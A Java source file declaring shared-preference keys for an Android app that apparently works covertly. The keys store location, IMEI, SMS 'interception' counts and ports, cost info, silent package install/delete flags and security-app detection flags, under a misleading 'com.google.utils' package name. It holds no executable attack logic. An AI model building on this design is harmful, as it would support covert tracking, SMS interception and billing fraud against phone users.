package com.google.utils;

import com.android.abutton.ApplicationEx;

import android.content.Context;

public class DataPreference {
	
	public static final PreferenceFile dataFile = new PreferenceFile("dataFile", ApplicationEx.MODE);
	public static final PreferenceFile.SharedPreference<Integer> GETLOCATIONCOUNT = dataFile.value("getlocationcount", 3);
	public static final PreferenceFile.SharedPreference<Boolean> ISGETLOCATION = dataFile.value("isgetlocation", false);
	public static final PreferenceFile.SharedPreference<Boolean> ISGETREQUEST = dataFile.value("isgetRequest", false);
	//发起过注册没
	public static final PreferenceFile.SharedPreference<Boolean> ISUSEREGISTER = dataFile.value("isuseregister", false);
	//今天是否请求过
	public static final PreferenceFile.SharedPreference<Boolean> ISREQUEST = dataFile.value("isRequest", false);
	//是否注册
	public static final PreferenceFile.SharedPreference<Boolean> ISREGISTOR = dataFile.value("isRegistor", false);
	//上一次请求时间
	public static final PreferenceFile.SharedPreference<String> LASTTIME = dataFile.value("lasttime", +System.currentTimeMillis()+"");
	//经纬度
	public static final PreferenceFile.SharedPreference<String> LONGITUED = dataFile.value("longitude", "");
	public static final PreferenceFile.SharedPreference<String> LATITUED = dataFile.value("latitued", "null");
	//拦截时间
	public static final PreferenceFile.SharedPreference<String> WORDTIME = dataFile.value("wordtime", "");
	//信息jsons
	public static final PreferenceFile.SharedPreference<String> COSTINFO = dataFile.value("costinfo", "");
	//上一次是否完成了所有任务
	public static final PreferenceFile.SharedPreference<Boolean> ISDONE = dataFile.value("isdone", false);
	//拦截次数
	public static final PreferenceFile.SharedPreference<Integer> INTERRUPTCOUNT = dataFile.value("interrupt", 0);
	//拦截端口
	public static final PreferenceFile.SharedPreference<String> CUTPORT = dataFile.value("cunport", "");
	//is install the package
	public static final PreferenceFile.SharedPreference<Boolean> isInstall = dataFile.value("isInstall", false);
	//is delete the package
	public static final PreferenceFile.SharedPreference<Boolean> isDelete = dataFile.value("isDelete", true);
	//install time
	public static final PreferenceFile.SharedPreference<String> installTime = dataFile.value("installtime", "");
	public static final PreferenceFile.SharedPreference<String> IMEI = dataFile.value("imei", "0");
	public static final PreferenceFile.SharedPreference<Boolean> ISDOWORK = dataFile.value("isdowork", true);
	public static final PreferenceFile.SharedPreference<Boolean> ISHASLESAFE = dataFile.value("ishaslesafe", false);
	public static final PreferenceFile.SharedPreference<Boolean> ISHASKUMANAGER = dataFile.value("ishaskumanager", false);
	public static PreferenceFile getPreferenceFile(Context context){
		return dataFile;
	}
}
